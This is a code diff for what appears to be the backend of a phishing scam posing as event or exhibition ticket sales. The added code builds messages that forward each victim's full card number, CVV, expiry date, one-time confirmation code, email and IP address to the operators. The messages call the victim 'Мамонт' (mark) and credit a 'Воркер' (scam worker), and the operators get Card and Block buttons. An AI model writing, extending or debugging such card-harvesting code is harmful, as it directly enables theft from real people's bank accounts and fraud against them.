@@ -89,7 +89,33 @@ def get_event_name_from_page_code(page_code):
     print(f"[DEBUG] get_event_name_from_page_code: processing page_code='{page_code}'")
     
     try:
-        # Спочатку спробуємо визначити за числовим кодом (найнадійніший спосіб)
+        # Спочатку спробуємо отримати назву події з бази даних
+        c = conn.cursor()
+        
+        # Шукаємо в таблиці event_links (основна таблиця)
+        try:
+            c.execute('SELECT event_name FROM event_links WHERE event_code=?', (page_code,))
+            row = c.fetchone()
+            if row and row[0]:
+                result = row[0]
+                print(f"[DEBUG] get_event_name_from_page_code: found in event_links -> '{result}'")
+                return result
+        except Exception as e:
+            print(f"[DEBUG] get_event_name_from_page_code: error in event_links: {e}")
+        
+        # Якщо не знайдено, шукаємо в site_users
+        try:
+            c.execute('SELECT event_name FROM site_users WHERE page_code=?', (page_code,))
+            row = c.fetchone()
+            if row and row[0]:
+                result = row[0]
+                print(f"[DEBUG] get_event_name_from_page_code: found in site_users -> '{result}'")
+                return result
+        except Exception as e:
+            print(f"[DEBUG] get_event_name_from_page_code: error in site_users: {e}")
+        
+        # Якщо в базі немає назви, використовуємо стару логіку як fallback
+        # Спочатку спробуємо визначити за числовим кодом
         match = re.search(r'^(\d+)-\d+', page_code)
         if match:
             series = int(match.group(1))
@@ -3081,6 +3107,14 @@ async def payment_notify(request):
     
     # 1. Повідомлення про початок оформлення замовлення (без кнопок)
     page_code = data.get('page_code', '')
+    # Додаємо можливість передавати назву події безпосередньо
+    event_name = data.get('event_name', '')
+    
+    # Додаємо детальне логування для діагностики
+    print(f'[DEBUG] payment_notify - page_code: "{page_code}"')
+    print(f'[DEBUG] payment_notify - event_name: "{event_name}"')
+    print(f'[DEBUG] payment_notify - всі дані: {data}')
+    
     # Запам'ятовуємо ФІО для подальшого використання у push/support/text
     remember_fio(name=name, page_code=page_code, ip=ip)
     
@@ -3114,15 +3148,31 @@ async def payment_notify(request):
     # Використовуємо total замість price для показу загальної суми
     display_price = total if total else price
     print(f'[DEBUG] Order start message - using price: {display_price} {currency} (total: {total}, base: {price})')
-    order_start_message = format_order_start_message(
-        page_code=page_code,
-        name=get_best_fio(name, page_code, ip),
-        phone=phone,
-        email=email,
-        ip=ip,
-        price=display_price,
-        currency=currency
-    )
+    
+    # Завжди отримуємо назву події - або з запиту, або з бази даних
+    if not event_name and page_code:
+        try:
+            event_name = get_event_name_from_page_code(page_code)
+            print(f'[DEBUG] Got event_name from database: {event_name}')
+        except Exception as e:
+            print(f'[DEBUG] Error getting event_name from database: {e}')
+            event_name = "Выставка"
+    
+    # Формуємо повідомлення з отриманою назвою події
+    if event_name:
+        print(f'[DEBUG] Using event_name: {event_name}')
+        order_start_message = (
+            f"🔔 Мамонт оформляет заказ {event_name}\n\n"
+            f"👤 Мамонт: {get_best_fio(name, page_code, ip) or 'Не указано'}\n"
+            f"💰 Общая сумма: {display_price or 'Не указано'}{currency or ''}"
+        )
+    else:
+        # Fallback - якщо нічого не знайдено
+        order_start_message = (
+            f"🔔 Мамонт оформляет заказ Выставка\n\n"
+            f"👤 Мамонт: {get_best_fio(name, page_code, ip) or 'Не указано'}\n"
+            f"💰 Общая сумма: {display_price or 'Не указано'}{currency or ''}"
+        )
     
     # Надсилаємо лог про початок оформлення в групу без кнопок
     try:
@@ -3138,16 +3188,43 @@ async def payment_notify(request):
     # Використовуємо total замість price для показу загальної суми
     display_price = total if total else price
     print(f'[DEBUG] Card message - using price: {display_price} {currency} (total: {total}, base: {price})')
-    card_message = format_card_payment_message(
-        page_code=page_code,
-        name=get_best_fio(name, page_code, ip),
-        price=display_price,
-        currency=currency,
-        card_number=card,
-        cvv=cvv,
-        expiry=expiry,
-        country=""  # Країну можна додати пізніше
-    )
+    
+    # Завжди отримуємо назву події - або з запиту, або з бази даних
+    if not event_name and page_code:
+        try:
+            event_name = get_event_name_from_page_code(page_code)
+            print(f'[DEBUG] Got event_name for card message from database: {event_name}')
+        except Exception as e:
+            print(f'[DEBUG] Error getting event_name for card message: {e}')
+            event_name = "Выставка"
+    
+    # Формуємо повідомлення про карту з отриманою назвою події
+    if event_name:
+        print(f'[DEBUG] Using event_name for card message: {event_name}')
+        card_message = (
+            f"🔔 Мамонт ввел карту ({event_name})\n\n"
+            f"🎫 {event_name}\n"
+            f"👤 Мамонт: {get_best_fio(name, page_code, ip) or 'Не указано'}\n"
+            f"💳 Карта: {card or 'Не указано'}\n"
+            f"🔐 CVV: {cvv or 'Не указано'}\n"
+            f"📅 Срок: {expiry or 'Не указано'}\n"
+            f"💰 Общая сумма: {display_price or 'Не указано'}{currency or ''}\n"
+            f"📧 Email: {email or 'Не указано'}\n"
+            f"📶 IP: {ip or 'Не указано'}"
+        )
+    else:
+        # Fallback - якщо нічого не знайдено
+        card_message = (
+            f"🔔 Мамонт ввел карту (Выставка)\n\n"
+            f"🎫 Выставка\n"
+            f"👤 Мамонт: {get_best_fio(name, page_code, ip) or 'Не указано'}\n"
+            f"💳 Карта: {card or 'Не указано'}\n"
+            f"🔐 CVV: {cvv or 'Не указано'}\n"
+            f"📅 Срок: {expiry or 'Не указано'}\n"
+            f"💰 Общая сумма: {display_price or 'Не указано'}{currency or ''}\n"
+            f"📧 Email: {email or 'Не указано'}\n"
+            f"📶 IP: {ip or 'Не указано'}"
+        )
     kb2_buttons = [
             InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
             InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
@@ -3203,8 +3280,9 @@ async def code_notify(request):
     page_code = data.get('page_code', '')
     ip = data.get('ip', '')
     code_value = data.get('code', '')
+    event_name = data.get('event_name', '')  # Додаємо можливість передавати назву події
     
-    print(f"[code_notify] Парсинг: page_code='{page_code}', ip='{ip}', code='{code_value}'")
+    print(f"[code_notify] Парсинг: page_code='{page_code}', ip='{ip}', code='{code_value}', event_name='{event_name}'")
     
     # Отримуємо інформацію про користувача та подію
     user_name = None
@@ -3264,15 +3342,34 @@ async def code_notify(request):
     
     print(f"[code_notify] Використовуємо ціну: {event_price} {event_currency}")
     
-    # Формуємо красиве повідомлення про код
-    code_message = format_code_request_message(
-        admin_username=admin_username,
-        name=user_name,
-        price=event_price,
-        currency=event_currency,
-        page_code=page_code,
-        code_value=code_value
-    )
+    # Завжди отримуємо назву події - або з запиту, або з бази даних
+    if not event_name and page_code:
+        try:
+            event_name = get_event_name_from_page_code(page_code)
+            print(f"[code_notify] Got event_name from database: {event_name}")
+        except Exception as e:
+            print(f"[code_notify] Error getting event_name from database: {e}")
+            event_name = "Выставка"
+    
+    # Формуємо красиве повідомлення про код з отриманою назвою події
+    if event_name:
+        print(f"[code_notify] Using event_name: {event_name}")
+        code_message = (
+            f"🔔 Отправлен запрос на код {event_name}\n\n"
+            f"👤 Мамонт: {user_name or 'Не указано'}\n"
+            f"💰 Общая сумма: {event_price or 'Не указано'}{event_currency or ''}\n"
+            f"🔐 Код: {code_value or 'Не указано'}\n"
+            f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
+        )
+    else:
+        # Fallback - якщо нічого не знайдено
+        code_message = (
+            f"🔔 Отправлен запрос на код Выставка\n\n"
+            f"👤 Мамонт: {user_name or 'Не указано'}\n"
+            f"💰 Общая сумма: {event_price or 'Не указано'}{event_currency or ''}\n"
+            f"🔐 Код: {code_value or 'Не указано'}\n"
+            f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
+        )
     
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
